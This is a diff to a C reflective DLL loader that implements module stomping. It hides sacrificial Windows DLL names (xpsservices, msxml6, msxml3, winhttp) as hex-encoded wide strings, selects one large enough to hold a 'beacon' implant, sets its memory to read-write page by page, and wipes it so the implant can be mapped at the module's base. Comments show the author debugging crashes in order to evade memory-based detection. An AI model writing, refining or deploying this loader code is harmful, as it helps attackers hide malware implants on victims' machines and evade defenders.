@@ -373,30 +373,35 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         pVQ == NULL || pLLW == NULL)
         return 0;
 
+    /* Map at the sacrificial HMODULE, not at its .text. RtlPcToFileHeader /
+     * PEB walks still report the real module base; if we handed DllMain a
+     * .text pointer, every RVA the beacon applies is 0x1000 too high and
+     * leftover original code (xpsservices EP at +0x1cf3e0, past our 0x67000
+     * overlay) stays PAGE_READWRITE - BEX64 DEP at 0x1d29d8 on the last
+     * dump. AceLdr copies the implant at the module base for this reason.
+     * Candidates must have SizeOfImage > beacon SizeOfImage. */
     for (k = 0; k < 4; k++) {
         unsigned short wname[28];
         QWORD * wq = (QWORD *)wname;
         unsigned char * cand;
         unsigned char * cand_nth;
-        IMG_SECTION * cand_sec;
-        DWORD cand_nsec, cand_szopt, ci;
-        unsigned char * sc_text = NULL;
-        SIZE_T sc_size = 0;
+        IMG_OPT64 * cand_opt;
         MEMORY_BASIC_INFORMATION mbi;
         HMODULE h;
+        DWORD cand_soi;
 
         wq[0] = 0; wq[1] = 0; wq[2] = 0; wq[3] = 0;
-        if (k == 0) {
+        if (k == 0) {        /* xpsservices.dll  SizeOfImage 0x2bc000 */
             wq[0] = 0x0073007300700078ULL; wq[1] = 0x0069007600720065ULL;
             wq[2] = 0x002E007300650063ULL; wq[3] = 0x0000006C006C0064ULL;
-        } else if (k == 1) {
-            wq[0] = 0x003200680066006DULL; wq[1] = 0x0065006400330036ULL;
-            wq[2] = 0x006C0064002E0063ULL; wq[3] = 0x000000000000006CULL;
-        } else if (k == 2) {
-            wq[0] = 0x0064007600720070ULL; wq[1] = 0x00630066006F006DULL;
-            wq[2] = 0x002E0070006D006FULL; wq[3] = 0x0000006C006C0064ULL;
-        } else {
-            wq[0] = 0x0065006F0073006DULL; wq[1] = 0x002E003200740072ULL;
+        } else if (k == 1) { /* msxml6.dll       SizeOfImage 0x261000 */
+            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0036006CULL;
+            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
+        } else if (k == 2) { /* msxml3.dll       SizeOfImage 0x20c000 */
+            wq[0] = 0x006D00780073006DULL; wq[1] = 0x0064002E0033006CULL;
+            wq[2] = 0x00000000006C006CULL; wq[3] = 0x0000000000000000ULL;
+        } else {             /* winhttp.dll      SizeOfImage 0x10d000 */
+            wq[0] = 0x0068006E00690077ULL; wq[1] = 0x002E007000740074ULL;
             wq[2] = 0x0000006C006C0064ULL; wq[3] = 0x0000000000000000ULL;
         }
         wname[27] = 0;
@@ -405,7 +410,6 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
         if (h == NULL)
             continue;
         cand = (unsigned char *)h;
-        /* refuse to stomp ourselves - the flat copy is a valid PE too */
         if (cand == flat) {
             if (pFL) pFL(h);
             continue;
@@ -415,43 +419,44 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
             if (pFL) pFL(h);
             continue;
         }
-        cand_nsec = *(WORD *)(cand_nth + 6);
-        cand_szopt = *(WORD *)(cand_nth + 20);
-        cand_sec = (IMG_SECTION *)(cand_nth + 24 + cand_szopt);
-
-        for (ci = 0; ci < cand_nsec; ci++) {
-            unsigned char * probe;
-            SIZE_T need;
-            if (!(cand_sec[ci].Characteristics & 0x20000000))
-                continue;
-            probe = cand + cand_sec[ci].VirtualAddress;
-            need = size_of_image;
-            if (pVQ(probe, &mbi, sizeof(mbi)) &&
-                mbi.State == MEM_COMMIT &&
-                mbi.RegionSize >= need &&
-                mbi.AllocationBase != flat &&
-                probe != flat) {
-                if (cand_sec[ci].VirtualSize > sc_size) {
-                    sc_size = cand_sec[ci].VirtualSize;
-                    sc_text = probe;
-                }
-            }
+        cand_opt = (IMG_OPT64 *)(cand_nth + 24);
+        cand_soi = cand_opt->SizeOfImage;
+        if (cand_soi < size_of_image) {
+            if (pFL) pFL(h);
+            continue;
         }
-        if (sc_text != NULL) {
-            sc_base = sc_text;
-            sc_span = sc_size;
-            break;
+        if (!pVQ(cand, &mbi, sizeof(mbi)) ||
+            mbi.State != MEM_COMMIT ||
+            mbi.AllocationBase != cand) {
+            if (pFL) pFL(h);
+            continue;
         }
-        if (pFL != NULL)
-            pFL(h);
+        sc_base = cand;
+        sc_span = cand_soi;
+        break;
     }
     if (sc_base == NULL || sc_base == flat)
         return 0;
 
+    /* Flip every committed page covering [base, base+SizeOfImage) to RW.
+     * VirtualProtect on a span larger than one region fails silently and
+     * leaves the original RX/R/RW mix, so walk with VirtualQuery. */
     {
-        DWORD oldp = 0;
-        if (!pVP(sc_base, sc_span, PAGE_READWRITE, &oldp))
-            return 0;
+        unsigned char * p = sc_base;
+        unsigned char * end = sc_base + size_of_image;
+        while (p < end) {
+            MEMORY_BASIC_INFORMATION mbi;
+            DWORD oldp = 0;
+            SIZE_T chunk;
+            if (!pVQ(p, &mbi, sizeof(mbi)))
+                return 0;
+            chunk = (SIZE_T)((unsigned char *)mbi.BaseAddress + mbi.RegionSize - p);
+            if (p + chunk > end)
+                chunk = (SIZE_T)(end - p);
+            if (!pVP(p, chunk, PAGE_READWRITE, &oldp))
+                return 0;
+            p += chunk;
+        }
     }
 
     bw_zero(sc_base, size_of_image);
